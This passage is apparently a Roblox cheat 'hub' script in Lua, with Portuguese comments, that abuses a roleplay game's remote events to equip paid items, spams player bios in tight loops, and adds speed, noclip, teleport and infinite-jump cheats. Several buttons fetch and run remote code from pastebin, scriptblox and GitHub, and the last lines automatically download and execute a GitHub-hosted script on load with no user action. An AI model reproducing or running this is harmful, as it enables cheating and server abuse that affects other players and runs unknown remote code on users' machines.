    end
})

AddButton(Main, {
  Name = "Deadly-Dark-Dominus",
      Callback = function()
        local args = {
            [1] = "wear",
            [2] = 3154654707
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
    end
})

AddButton(Main, {
  Name = "Red-Thorn-Dominus",
      Callback = function()
        local args = {
            [1] = "wear",
            [2] = 17183006842
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
    end
})

AddButton(Main, {
  Name = "Eternal-Crimson-Dominus",
      Callback = function()
        local args = {
            [1] = "wear",
            [2] = 17333680804
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
    end
})

AddButton(Main, {
  Name = "Gold-Dominus",
      Callback = function()
        local args = {
            [1] = "wear",
            [2] = 16696910487
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
    end
})

AddButton(Main, {
  Name = "Dominus-Of-TRS",
      Callback = function()
        local args = {
            [1] = "wear",
            [2] = 17761248987
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
    end
})

local section = AddSection(Main, {"Builders Hat"})

AddButton(Main, {
  Name = "Builders-Club-Hard-Hat",
      Callback = function()
        local args = {
            [1] = "wear",
            [2] = 1080951
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
    end
})

AddButton(Main, {
  Name = "Turbo-Builders-Club-Hard-Hat",
      Callback = function()
        local args = {
            [1] = "wear",
            [2] = 11844853
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
    end
})

AddButton(Main, {
  Name = "Outrageous-Builders-Club-Hard-Hat",
      Callback = function()
        local args = {
            [1] = "wear",
            [2] = 17408283
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
    end
})

AddButton(Main, {
  Name = "Cartola Builders Club",
      Callback = function()
        local args = {
            [1] = "wear",
            [2] = 173784725
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
    end
})

local section = AddSection(Main, {"[FE] headless"})

AddButton(Main, {
  Name = "Headless",
      Callback = function()
        local args = {
            [1] = "CharacterChange",
            [2] = {
                [1] = 1,
                [2] = 1,
                [3] = 1,
                [4] = 1,
                [5] = 1,
                [6] = 134082579
            },
            [3] = "by:REDz"
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
    end
})

local section = AddSection(Main, {"Abóboras [Efeitos]"})

AddButton(Main, {
  Name = "Abóbora Com Efeitos Azuis",
      Callback = function()
        local args = {
            [1] = "wear",
            [2] = 183468963
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
    end
})

AddButton(Main, {
  Name = "Abóbora Com Efeitos Verdes",
      Callback = function()
        local args = {
            [1] = "wear",
            [2] = 132809431
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
    end
})

local section = AddSection(Main, {"Valkyries"})

AddButton(Main, {
  Name = "Violet-Valkyrie",
      Callback = function()
        local args = {
            [1] = "wear",
            [2] = 17569661551
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
    end
})

AddButton(Main, {
  Name = "Verdant-Valkyrie",
      Callback = function()
        local args = {
            [1] = "wear",
            [2] = 14910822651
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
    end
})

AddButton(Main, {
  Name = "Pink-Storm-Valkyrie-Helm",
      Callback = function()
        local args = {
            [1] = "wear",
            [2] = 14782204807
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
    end
})

AddButton(Main, {
  Name = "Red-And-Blue-Valkyrie",
      Callback = function()
        local args = {
            [1] = "wear",
            [2] = 17447344274
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
    end
})

AddButton(Main, {
  Name = "Valkyrie-of-Sapphires",
      Callback = function()
        local args = {
            [1] = "wear",
            [2] = 15247704077
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
    end
})

AddButton(Main, {
  Name = "Deaths-Shadow-Valkyrie-Helm",
      Callback = function()
        local args = {
            [1] = "wear",
            [2] = 15064770203
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
    end
})

AddButton(Main, {
  Name = "Midnight-Valkyrie",
      Callback = function()
        local args = {
            [1] = "wear",
            [2] = 14833429879
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
    end
})

AddButton(Main, {
  Name = "Onyx-Valkyrie",
      Callback = function()
        local args = {
            [1] = "wear",
            [2] = 14961956324
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
    end
})

local Main = MakeTab({Name = "Scripts"})

local Label = AddTextLabel(Main,
{"Execute Scripts"})

AddButton(Main, {
  Name = "Shiftlock By Noel",
  Callback = function()
      loadstring(game:HttpGet("https://pastebin.com/raw/MdeBwdNr"))()
  end
})

AddButton(Main, {
  Name = "Systembroken",
  Callback = function()
         loadstring(game:HttpGet("https://scriptblox.com/raw/Ragdoll-Engine-BEST-SCRIPT-WORKING-SystemBroken-7544"))()
  end
})

AddButton(Main, {
  Name = "Ghost Hub",
  Callback = function()
      loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-X-Ghost-Hub-X-7595"))()
  end
})

AddButton(Main, {
  Name = "Fly By Shelby",
  Callback = function()
       loadstring(game:HttpGet('https://pastebin.com/raw/LbWnT2DT', true))()
  end
})

AddButton(Main, {
  Name = "Vfly Script",
  Callback = function()
      loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Mobile-vfly-by-Warrior-roberr-8993"))()
  end
})

AddButton(Main, {
  Name = "Spin Fling Gui",
  Callback = function()
         loadstring(game:HttpGet('https://pastebin.com/raw/r97d7dS0', true))()
  end
})

AddButton(Main, {
  Name = "Julhub",
  Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/JulHubz/JulHub/main/JulHub"))()
  end
})

AddButton(Main, {
  Name = "Redzhub",
  Callback = function()
      loadstring(game:HttpGet("https://scriptblox.com/raw/Brookhaven-RP-RedZHub-9326"))()
  end
})

MakeNotifi({
  Title = "Shnmaxhub Notification",
  Text = "Welcome To Shnmaxhub",
  Time = 10
})

-- Definir a função de notificação
function MakeNotifi(notification)
    game.StarterGui:SetCore("SendNotification", {
        Title = notification.Title;
        Text = notification.Text;
        Duration = notification.Time;
    })
end

-- Função para enviar notificações personalizadas
function SendPlayerNotification(player, action)
    local message = ""
    if action == "entered" then
        message = "o jogador " .. player.Name .. " entrou na experiência"
    elseif action == "left" then
        message = "o jogador " .. player.Name .. " saiu da experiência"
    elseif action == "rejoined" then
        message = "o jogador " .. player.Name .. " religou da experiência"
    end

    MakeNotifi({
        Title = "Shnmaxhub Notification",
        Text = message,
        Time = 10
    })
end

-- Conectar eventos de entrada e saída de jogadores
game.Players.PlayerAdded:Connect(function(player)
    SendPlayerNotification(player, "entered")
    
    player.AncestryChanged:Connect(function()
        if player:IsDescendantOf(game) then
            SendPlayerNotification(player, "rejoined")
        else
            SendPlayerNotification(player, "left")
        end
    end)
end)

game.Players.PlayerRemoving:Connect(function(player)
    SendPlayerNotification(player, "left")
end)

local CmdsTab = MakeTab({Name = "Admin CMDS"})

local Label = AddTextLabel(CmdsTab,
{"Está Pagina Ja Esta finalizada"})

-- Adicionar slider de controle de velocidade na guia CMDS
local sliderSpeed
sliderSpeed = AddSlider(CmdsTab, {
    Name = "Slider Speed",
    MinValue = 10,
    MaxValue = 500,
    Default = 25,
    Increase = 1,
    Callback = function(value)
        -- Aqui você obtém o jogador e seu personagem
        local player = game.Players.LocalPlayer
        local character = player.Character

        if character then
            -- Obtém o humanoide do personagem para alterar a velocidade de caminhada
            local humanoid = character:FindFirstChildOfClass("Humanoid")

            if humanoid then
                -- Ajusta a velocidade de caminhada para o valor do slider
                humanoid.WalkSpeed = value
            end
        end
    end
})

-- Adicionar slider de controle de pulo na guia CMDS
local sliderJumpPower
sliderJumpPower = AddSlider(CmdsTab, {
    Name = "Slider JumpPower",
    MinValue = 50,
    MaxValue = 500,
    Default = 100,
    Increase = 5,
    Callback = function(value)
        -- Aqui você obtém o jogador e seu personagem
        local player = game.Players.LocalPlayer
        local character = player.Character

        if character then
            -- Obtém o humanoide do personagem para alterar a potência do pulo
            local humanoid = character:FindFirstChildOfClass("Humanoid")

            if humanoid then
                -- Ajusta a potência do pulo para o valor do slider
                humanoid.JumpPower = value
            end
        end
    end
})

-- Adicionar botão na guia CMDS para restaurar sliders
AddButton(CmdsTab, {
  Name = "Restaurar Slider Speed/Jump",
  Callback = function()
    -- Obter o jogador e seu personagem
    local player = game.Players.LocalPlayer
    local character = player.Character

    if character then
        -- Obter o humanoide do personagem para restaurar os valores padrão
        local humanoid = character:FindFirstChildOfClass("Humanoid")

        if humanoid then
            -- Restaurar os valores padrão
            humanoid.WalkSpeed = 16  -- Valor padrão de WalkSpeed
            humanoid.JumpPower = 50  -- Valor padrão de JumpPower
        end
    end

    -- Atualizar os sliders para refletir os valores padrão
    sliderSpeed:SetValue(25)  -- Atualizar slider de velocidade para o valor padrão
    sliderJumpPower:SetValue(100)  -- Atualizar slider de pulo para o valor padrão
  end
})

-- Função para adicionar a ferramenta de velocidade
local function giveSpeedtool()
    local player = game.Players.LocalPlayer
    local tool = Instance.new("Tool")
    tool.RequiresHandle = false
    tool.Name = "WalkSpeed"

    -- Função para equipar o item, aumentar a velocidade e mudar o nome da ferramenta
    tool.Equipped:Connect(function()
        player.Character.Humanoid.WalkSpeed = 200
        tool.Name = "Desligar o Speed"
    end)

    -- Função para desativar o item, restaurar a velocidade e mudar o nome da ferramenta de volta ao original
    tool.Unequipped:Connect(function()
        player.Character.Humanoid.WalkSpeed = 16
        tool.Name = "Ativar o Speed"
    end)

    tool.Parent = player.Backpack
end

-- Adiciona o botão Speedtool à guia CMDS
AddButton(CmdsTab, {
    Name = "Walkspeed - Tool",
    Description = "Dê a ferramenta de velocidade ao jogador",
    Callback = function()
        giveSpeedtool()
    end
})

local section = AddSection(CmdsTab, {"Admin/Programming Local"})

AddButton(CmdsTab, {
  Name = "Abrir console Dev",
  Callback = function()
local StarterGui = game:GetService("StarterGui")
StarterGui:SetCore("DevConsoleVisible", true)
  end
})

-- Obter serviços e jogador local
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TeleportService = game:GetService("TeleportService")

-- Variável para armazenar a mensagem de kick
local kickMessage = ""

-- Função para kickar o jogador local com uma mensagem personalizada
local function kickPlayer(message)
    LocalPlayer:Kick(message)
    -- Esperar um pouco antes de tentar reconectar
    wait(2)
    -- Reentrar no jogo
    TeleportService:Teleport(game.PlaceId, LocalPlayer)
end

-- Adicionar uma TextBox para a mensagem de kick
local TextBox = AddTextBox(CmdsTab, {
    Name = "Mensagem de kick",
    Default = "",
    PlaceholderText = "Digite aqui a mensagem",
    ClearText = true,
    Callback = function(Value)
        -- Armazenar o valor da mensagem para usar no botão
        kickMessage = Value
    end
})

-- Adicionar um botão para acionar o kick
local Button = AddButton(CmdsTab, {
    Name = "Kick [cliente mensagem]",
    Callback = function()
        -- Verifica se a mensagem foi definida
        if kickMessage and kickMessage ~= "" then
            kickPlayer(kickMessage)
        else
            print("Nenhuma mensagem definida para o kick.")
        end
    end
})

local section = AddSection(CmdsTab, {"CMDS"})

AddButton(CmdsTab, {
  Name = "Tptool [By: Xxxtentacion]",
  Callback = function()
    local player = game.Players.LocalPlayer
    local mouse = player:GetMouse()

    local function createTeleportTool()
        local tool = Instance.new("Tool")
        tool.RequiresHandle = false
        tool.Name = "Teleport Tool - SHNMAX"

        tool.Activated:Connect(function()
            local hitPos = mouse.Hit.p + Vector3.new(0, 2.5, 0)
            local pos = CFrame.new(hitPos)
            player.Character.HumanoidRootPart.CFrame = pos
        end)

        tool.Parent = player.Backpack
    end

    -- Cria a ferramenta inicialmente
    createTeleportTool()

    -- Adiciona a ferramenta novamente quando o personagem é reaparecido
    player.CharacterAdded:Connect(function()
        wait(0.1) -- Espera um curto período de tempo para garantir que o inventário seja carregado
        createTeleportTool()
    end)
  end
})

-- Variável para controlar o estado do pulo infinito
local infiniteJumpEnabled = false

-- Conectar o evento de pulo somente uma vez
local infiniteJumpConnection

-- Função de callback para o botão de alternância de pulo infinito
local function onInfiniteJumpToggle(value)
    infiniteJumpEnabled = value
    print("Infinite Jump Enabled:", infiniteJumpEnabled)
    
    -- Conectar o evento de pulo somente uma vez
    if not infiniteJumpConnection then
        infiniteJumpConnection = game:GetService("UserInputService").JumpRequest:Connect(function()
            if infiniteJumpEnabled then
                local player = game.Players.LocalPlayer
                local character = player.Character
                if character and character:FindFirstChildOfClass("Humanoid") then
                    character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
                end
            end
        end)
    end
end

-- Adiciona o botão de alternância "Infinitejump"
local Toggle = AddToggle(CmdsTab, {
    Name = "Infinite Jump",
    Default = false,
    Callback = onInfiniteJumpToggle
})

-- Variável para controlar o estado do Noclip
local noclipEnabled = false
local runService = game:GetService("RunService")

-- Função para definir CanCollide para todas as partes do personagem
local function setCharacterCanCollide(character, canCollide)
    for _, part in ipairs(character:GetDescendants()) do
        if part:IsA("BasePart") then
            part.CanCollide = canCollide
        end
    end
end

-- Função de callback para o botão de alternância de Noclip
local function onNoclipToggle(value)
    noclipEnabled = value
    print("Noclip Enabled:", noclipEnabled)
    
    local player = game.Players.LocalPlayer
    local character = player.Character

    if noclipEnabled then
        -- Inicia um loop para continuamente definir CanCollide
        noclipLoop = runService.Stepped:Connect(function()
            if character then
                setCharacterCanCollide(character, false)
            end
        end)
    else
        -- Desativa o loop e restaura CanCollide
        if noclipLoop then
            noclipLoop:Disconnect()
        end
        if character then
            setCharacterCanCollide(character, true)
        end
    end
end

-- Adiciona o botão de alternância "Noclip"
local Toggle = AddToggle(CmdsTab, {
    Name = "Noclip",
    Default = false,
    Callback = onNoclipToggle
})

local section = AddSection(CmdsTab, {"Nomes De ilusão [Pode nao funcionar Corretamente]"})

local Looping = false

local Toggle = AddToggle(CmdsTab, {
  Name = "Loop SHNMAXSCRIPTS NAME",
  Default = false,
  Callback = function(Value)
    Looping = Value
    if Looping then
      while Looping do
        game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer("RolePlayBio", "S̵̳̲̜H̸̜͓̗̪̟̪͖Ṇ̵͇̤̖M̶͉͓̹͇̲A̷͓̬X̴̩̞̱Ṣ̵̙̬͈C̸̤̩̲R̶̜̰I̴͇͓͔͚P̷̝̖͇T̵̯̰͉̞̠S̵̹̭")
        wait(0.0) -- Tempo de espera reduzido para 0.1 segundos
        game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer("RolePlayBio", "")
        wait(0.0) -- Tempo de espera reduzido para 0.1 segundos
      end
    else
      game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer("RolePlayBio", "")
    end
  end
})

local Looping = false

local Toggle = AddToggle(CmdsTab, {
  Name = "Nome SHNMAX",
  Default = false,
  Callback = function(Value)
    Looping = Value
    if Looping then
      while Looping do
        game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer("RolePlayBio", " S̵̙͕̀̃Hͥ̽ͣ̃̔N̺̻̔̆ͅM͉̅ͮ͒ͤA̷͙ͭͫ̕X̵̹̬̄̽")
        wait(0.0) -- Tempo de espera reduzido para 0.1 segundos
        game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer("RolePlayBio", "")
        wait(0.0) -- Tempo de espera reduzido para 0.1 segundos
      end
    else
      game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer("RolePlayBio", "")
    end
  end
})

local Looping = false

local Toggle = AddToggle(CmdsTab, {
  Name = "Loop Nome ANTI KIDS",
  Default = false,
  Callback = function(Value)
    Looping = Value
    if Looping then
      while Looping do
        game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer("RolePlayBio", "A̷͙ͭͫ̕N̺̻̔̆ͅT̨͈͗̌ͥI̍̅̀̎̊ K͕͓͌̎̾I̍̅̀̎̊D̶͔̭̪̻S̵̙͕̀̃")
        wait(0.0) -- Tempo de espera reduzido para 0.1 segundos
        game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer("RolePlayBio", "")
        wait(0.0) -- Tempo de espera reduzido para 0.1 segundos
      end
    else
      game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer("RolePlayBio", "")
    end
  end
})

local Looping = false

local Toggle = AddToggle(CmdsTab, {
  Name = "Loop System Boss",
  Default = false,
  Callback = function(Value)
    Looping = Value
    if Looping then
      while Looping do
        game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer("RolePlayBio", "I̍̅̀̎̊M͉̅ͮ͒ͤ S̵̙͕̀̃Ỵ̛̖͋͢S̵̙͕̀̃T̨͈͗̌ͥḚͭ̉̇͟M͉̅ͮ͒ͤ R͉̜̎͡͠U̠҉̷̙ͦN̺̻̔̆ͅ P̧͕̒̊͘L̸̖̽̌͂A̷͙ͭͫ̕Ỵ̛̖͋͢Ḛͭ̉̇͟R͉̜̎͡͠! ")
        wait(0.0) -- Tempo de espera reduzido para 0.1 segundos
        game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer("RolePlayBio", "")
        wait(0.0) -- Tempo de espera reduzido para 0.1 segundos
      end
    else
      game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer("RolePlayBio", "")
    end
  end
})

-- Função para executar automaticamente o código fornecido
local function AutoExecute()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Xtentacion178/Iys/main/Dbbd"))()
end

-- Chama a função para executar automaticamente o código
AutoExecute()